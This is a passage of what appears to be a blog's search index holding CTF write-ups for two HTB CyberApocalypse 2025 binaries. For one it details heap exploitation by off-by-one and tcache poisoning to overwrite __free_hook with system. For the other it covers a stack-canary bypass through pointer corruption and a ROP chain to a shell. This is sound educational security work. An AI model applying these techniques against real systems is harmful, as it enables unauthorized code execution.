    "text": "# Heap Exploitation Deep Dive: Tcache Poisoning via Off-by-One\n\nHeap exploitation often involves subtle vulnerabilities that corrupt metadata, leading to powerful control over memory allocation. This post explores how a seemingly minor off-by-one heap overflow can be escalated into a full Tcache poisoning attack to achieve arbitrary code execution. We'll analyze a specific binary (`strategist`) to illustrate the steps involved, including leaking a `libc` address and overwriting the `__free_hook`.\n\nThis analysis focuses on heap vulnerabilities. For an example of stack exploitation, see the companion post on [Exploiting Stack Pointer Corruption to Bypass Canaries](link-to-contractor-post.md). ## Binary Analysis Context\n\nThe target is a 64-bit ELF binary that manages user-defined \"plans\" using dynamic memory allocation (`malloc`, `free`, etc.). Security mitigations include:\n\n```text\n[*] './strategist'\nArch:       amd64-64-little\nRELRO:      Full RELRO\nStack:      Canary found\nNX:         NX enabled\nPIE:        PIE enabled\nRUNPATH:    b'./glibc/'\nStripped:   No\nFull RELRO prevents easy GOT overwrites, and PIE necessitates an information leak. The core vulnerability lies in the edit_plan functionality."
  },
  {
    "objectID": "blogs/strategist.html#binary-analysis-context",
    "href": "blogs/strategist.html#binary-analysis-context",
    "title": "CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "",
    "text": "The target is a 64-bit ELF binary that manages user-defined ‚Äúplans‚Äù using dynamic memory allocation (malloc, free, etc.). Security mitigations include:\n[*] './strategist'\nArch:       amd64-64-little\nRELRO:      Full RELRO\nStack:      Canary found\nNX:         NX enabled\nPIE:        PIE enabled\nRUNPATH:    b'./glibc/'\nStripped:   No\nFull RELRO prevents easy GOT overwrites, and PIE necessitates an information leak. The core vulnerability lies in the edit_plan functionality."
  },
  {
    "objectID": "blogs/strategist.html#exploitation-method-walkthrough-tcache-poisoning",
    "href": "blogs/strategist.html#exploitation-method-walkthrough-tcache-poisoning",
    "title": "HTB CyberApocalypse 2025 - Strategist: Heap Exploitation via Off-by-One and Tcache Poisoning",
    "section": "",
    "text": "The exploit combines the off-by-one, Unsorted Bin leak, and Tcache poisoning:\n\nLeaking a Libc Address (Unsorted Bin Attack):\n\n\nAllocate a large chunk (L), sized specifically so it won‚Äôt fit in Tcache (e.g., &gt; 0x410 bytes).\n\n\nAllocate a small ‚Äúbarrier‚Äù chunk immediately after L. This prevents L from merging with the wilderness (top chunk) when freed.\n\n\nfree(L). Since L is large, it‚Äôs placed into the Unsorted Bin. Its fd and bk pointers now point into libc‚Äôs main_arena.\n\n\nAllocate a new small chunk (S). malloc often satisfies small requests by splitting larger chunks from the Unsorted Bin. When L is split, the main_arena pointer (originally in L-&gt;fd) is copied into the user data area of the newly allocated chunk S.\n\n\nUse the program‚Äôs show functionality to read the contents of S. Extract the leaked main_arena pointer. Calculate the libc base address by subtracting the known offset of main_arena (relative to the leak point) from the leaked address. This defeats ASLR for libc, giving us the runtime addresses of system, __free_hook, etc.\n\n\nHeap Setup and Metadata Corruption:\n\n\nAllocate several small chunks with distinct patterns (e.g., A(0x28, ‚ÄòAAAA‚Äô), B(0x18, ‚Äò/bin/sh‚Äô), C(0x28, ‚ÄòCCCC‚Äô), D(0x18, ‚ÄòDDDD‚Äô)). This careful setup arranges the heap for the Tcache manipulation and makes debugging easier.\n\n\nTrigger the Off-by-One Vulnerability: Use the edit function on chunk A. Provide exactly 0x28 bytes of input, ending with a carefully chosen byte (like \\x41 or \\x91). This overwrites the LSB of the adjacent chunk B‚Äôs size field, changing its size from 0x21 to 0x41 (or 0x91). This corrupted size is important mainly to prevent free from attempting to consolidate B with adjacent chunks later, which could disrupt the Tcache state.\n\n\nTcache Manipulation and Hook Overwrite:\n\n\nFree chunks in a specific order to manipulate the Tcache lists. To target the Tcache[0x20] bin (for chunks of size 0x18 + metadata), a potential order is: free(C) (idx 3), free(A) (idx 1), free(D) (idx 4), then free(B) (idx 2). This sequence aims to place B (the chunk with the corrupted size field) at the head of the Tcache[0x20] list, with its fd pointing to the previously freed chunk D. State: Tcache[0x20]: B(fd=&D) -&gt; D -&gt; NULL.\n\n\nPoison the fd Pointer: Allocate a new chunk (P), ensuring its size (e.g., 0x28) and position on the heap cause it to physically overlap the memory previously occupied by the now-freed chunk B. Write a payload into P consisting of padding followed by the target address: [Padding] + p64(address_of___free_hook). The padding must be precisely calculated so that the p64 write overwrites the memory location where B‚Äôs fd pointer is stored within the Tcache metadata structure.\n\n\nRetrieve Target Address: Allocate a chunk of size 0x18. malloc returns chunk B from the head of the Tcache[0x20] list. Allocate another chunk of size 0x18. malloc now follows the poisoned fd pointer (which points to __free_hook) and returns the address &__free_hook.\n\n\nOverwrite Hook: The pointer returned by the second malloc(0x18) points directly to __free_hook. Use the program‚Äôs edit functionality on the chunk associated with this pointer. Write the address of the system function (calculated using the leaked libc base) into this chunk. This directly overwrites the __free_hook function pointer itself with &system.\n\n\nTriggering Code Execution:\n\n\nFree the chunk containing the command string ‚Äú/bin/sh‚Äù (original chunk B, index 2 in our setup).\n\n\nWhen free() is called, the glibc implementation first checks if __free_hook is non-NULL. Since we overwrote it with the address of system, the hook is called.\n\n\nThe hook (system) is called with the address of the chunk being freed (B, containing ‚Äú/bin/sh‚Äù) as its argument.\n\n\nThis results in the execution of system(\"/bin/sh\"), spawning a shell and giving the attacker control."
  },
  {
    "objectID": "blogs/strategist.html#challenge-description-and-context",
    "href": "blogs/strategist.html#challenge-description-and-context",
    "title": "HTB CyberApocalypse 2025 - Strategist: Heap Exploitation via Off-by-One and Tcache Poisoning",
    "section": "",
    "text": "The challenge presented the strategist binary and remote access, setting the scene with:\n\n‚ÄúTo move forward, Sir Alaric requests each member of his team to present their most effective planning strategy. The individual with the strongest plan will be appointed as the Strategist for the upcoming war. Put forth your best effort to claim the role of Strategist!‚Äù\n\nThe binary allows managing ‚Äúplans‚Äù via dynamic memory allocation (malloc, free, etc.). Security mitigations present a typical modern challenge:\n[*] './strategist'\nArch:       amd64-64-little\nRELRO:      Full RELRO\nStack:      Canary found\nNX:         NX enabled\nPIE:        PIE enabled\nRUNPATH:    b'./glibc/'\nStripped:   No\nFull RELRO prevents easy GOT overwrites, PIE necessitates an information leak (like a libc address), and NX prevents executing shellcode directly on the stack or heap. The core vulnerability lies in the edit_plan functionality."
  },
  {
    "objectID": "blogs/contractor.html#vulnerability-3-stack-layout-canary-bypass-via-stack-pointer-corruption",
    "href": "blogs/contractor.html#vulnerability-3-stack-layout-canary-bypass-via-stack-pointer-corruption",
    "title": "HTB CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "Vulnerability 3 & Stack Layout: Canary Bypass via Stack Pointer Corruption",
    "text": "Vulnerability 3 & Stack Layout: Canary Bypass via Stack Pointer Corruption\nThe primary obstacle to exploiting the overflow is the stack canary, placed by the compiler between local variables (like specialty_buffer) and the saved frame pointer (RBP) / return address (RIP) to detect overflows. A direct overflow overwriting RIP would also overwrite the canary, triggering __stack_chk_fail. This challenge allows bypassing the canary due to a specific stack layout and how the overflow write is implemented.\nDetailed Stack Layout Analysis (via Debugging): Dynamic analysis reveals the precise layout of relevant data on the stack during the execution of the function containing the vulnerable edit loop (higher addresses are ‚Äúup‚Äù the stack, closer to the function return):\n      +-------------------------+ High Address  &lt;-- Function Return\n      | Saved RIP               | **Target for Overwrite** (Controls execution flow)\n      +-------------------------+\n      | Stack Canary            | **Obstacle** (Must NOT be modified before check)\n      +-------------------------+\n      | Saved RBP (Frame Ptr)   | (Often overwritten, but less critical here)\n      +-------------------------+\n      | Stack Ptr (*inf_ptr)    | ***Corruption Target*** (Pointer TO the user info struct)\n      +-------------------------+\n      | Binary Ptr (leaked val) | (Value leaked in Vuln 1)\n      +-------------------------+\n      | specialty_buffer[16]    | ***Overflow Source*** (16-byte buffer)\n      +-------------------------+\n      | Other local vars...     | (name, reason, age buffers etc.)\n      +-------------------------+ Low Address\nKey Observations from Layout: * inf_ptr Position: A pointer variable named inf_ptr (or similar, found via reversing) exists on the stack. This pointer holds the starting address of the structure containing the user‚Äôs name, reason, age, and specialty. Crucially, this inf_ptr variable is located after the specialty_buffer but before the Saved RBP and the Stack Canary. * Write Mechanism: The vulnerable edit loop (Vulnerability 2) calculates the destination address for each byte it writes using this inf_ptr: the conceptual write is *(inf_ptr + field_offset + loop_index) = input_byte;.\nThe Corruption Mechanism: The bypass exploits the fact that the pointer used for writing (inf_ptr) can itself be overwritten during the overflow, and this change takes effect immediately for subsequent writes within the same loop execution. 1. The attacker crafts a payload that starts by filling the 16-byte specialty_buffer. 2. The payload continues, overflowing past the buffer and the leaked Binary Pointer area. 3. The payload reaches the memory location where the inf_ptr variable is stored. 4. The attacker carefully crafts the payload to overwrite only the Least Significant Byte (LSB) of the inf_ptr value with a specific byte (e.g., \\xcf). The exact byte needed depends on the runtime stack alignment (influenced by ASLR) and must be found via trial-and-error or calculation if alignment patterns are known. 5. On the next iteration of the write loop (and all subsequent iterations), the now corrupted value of inf_ptr is used to calculate the write destination address. 6. The change in the LSB effectively shifts the calculated destination address higher up the stack. This causes the remaining part of the attacker‚Äôs payload (containing the desired ROP chain / target RIP address) to ‚Äújump‚Äù over the Saved RBP and the Stack Canary, landing directly onto the Saved RIP location.\nBecause the canary value itself is never overwritten, the __stack_chk_fail check passes when the function attempts to return, but execution resumes at the attacker-controlled address now stored in RIP."
  },
  {
    "objectID": "blogs/contractor.html#exploitation-method-step-by-step",
    "href": "blogs/contractor.html#exploitation-method-step-by-step",
    "title": "HTB CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "Exploitation Method Step-by-Step",
    "text": "Exploitation Method Step-by-Step\nThe exploitation strategy combines these vulnerabilities:\n\nLeak Binary Base Address:\n\nSend initial inputs (name, reason, age).\nSend exactly 16 non-newline bytes for the specialty to trigger the unterminated read (Vulnerability 1).\nReceive the program‚Äôs output and parse the bytes immediately following the 16 input bytes to extract the leaked binary pointer.\nCalculate the runtime base address of the binary using the leak and the known static offset.\n\nTrigger Vulnerable Input:\n\nSelect menu option 4 to trigger the vulnerable edit function for the specialty field (Vulnerability 2).\n\nCraft Payload for Canary Bypass and RIP Control:\n\nConstruct the payload buffer:\n\nPadding: Bytes (e.g., 32 As) to fill the specialty_buffer, overflow past the saved binary pointer, and reach the LSB of the inf_ptr variable on the stack.\nCorruption Byte: The specific byte (e.g., \\xcf) calculated or guessed to corrupt the LSB of inf_ptr appropriately for the current stack alignment.\nROP Chain: The sequence of addresses to be written to the stack using the corrupted inf_ptr. This typically includes:\n\np64(address_of_ret_gadget): A ret instruction address (calculated using the leaked base address). This is often needed for stack alignment before calling functions, especially in 64-bit Linux.\np64(address_of_contract_function): The target function address (calculated using the leaked base address).\n\n\n\nSend Payload and Confirm:\n\nSend the crafted payload buffer when prompted for the new specialty.\nSend the confirmation (e.g., ‚ÄúYes‚Äù) to finalize the edit.\n\nAchieve Control:\n\nIf the LSB corruption byte was correct for the current stack alignment, the payload overwrites the Saved RIP via the corrupted pointer mechanism, bypassing the canary check.\nWhen the function returns, execution jumps to the ret gadget, then to the contract function, executing execl(\"/bin/sh\", ...).\n\nRetry if Necessary:\n\nBecause the success of the LSB corruption depends on runtime stack alignment (ASLR), the correct byte might vary slightly between executions.\nWrap the core exploitation logic (steps 2-5) in a loop that automatically restarts the process if it fails (e.g., the connection closes or expected output isn‚Äôt received), trying the same corruption byte until it aligns correctly by chance."
  },
  {
    "objectID": "blogs/contractor.html#binary-analysis-context-scenario",
    "href": "blogs/contractor.html#binary-analysis-context-scenario",
    "title": "HTB CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "Binary Analysis Context & Scenario",
    "text": "Binary Analysis Context & Scenario\nThe subject of this analysis is a 64-bit ELF binary from the CTF. The challenge description sets the scene:\n\n‚ÄúSir Alaric calls upon the bravest adventurers to join him in assembling the mightiest army in all of Eldoria. Together, you will safeguard the peace across the villages under his protection. Do you have the courage to answer the call?‚Äù\n\nThe program interacts by taking user details (name, reason, age, specialty) and then allowing edits. Key security mitigations enabled present a significant challenge:\n[*] './contractor'\nArch:       amd64-64-little\nRELRO:      Full RELRO       (GOT protected)\nStack:      Canary found     (Stack overflow detection)\nNX:         NX enabled       (No shellcode execution on stack)\nPIE:        PIE enabled      (Address space randomization for binary)\nRUNPATH:    b'./glibc/'\nSHSTK:      Enabled          (Shadow Stack, additional control-flow protection)\nIBT:        Enabled          (Indirect Branch Tracking, more CFI)\nStripped:   No               (Symbols available, helps analysis)\nThe presence of Canary, PIE, NX, SHSTK, and IBT means a simple overflow won‚Äôt work; we need leaks and a way around the control-flow integrity checks and canary. The core vulnerabilities lie in how the ‚Äòspecialty‚Äô field input is handled. A function named contract exists, which simply calls execl(\"/bin/sh\", \"sh\", 0), making it an ideal target address for our exploit payload.\nint64_t contract() {\n    // Simplified - includes canary check logic before/after execl\n    execl(\"/bin/sh\", \"sh\", 0); // The goal function\n    // ... canary check logic ...\n    if (canary_corrupted) {\n        __stack_chk_fail(); // Abort if canary is wrong\n    }\n    return 0; // Or similar exit path if execl fails\n}"
  },
  {
    "objectID": "index.html#projects",
    "href": "index.html#projects",
    "title": "Home",
    "section": "Projects",
    "text": "Projects\nCheck out my GitHub profile for all my ongoing and completed projects.\nSome of my chosen projects and CTF writeups are explained in more detail in the blog section, where I share my approach and the techniques I used."
  }
]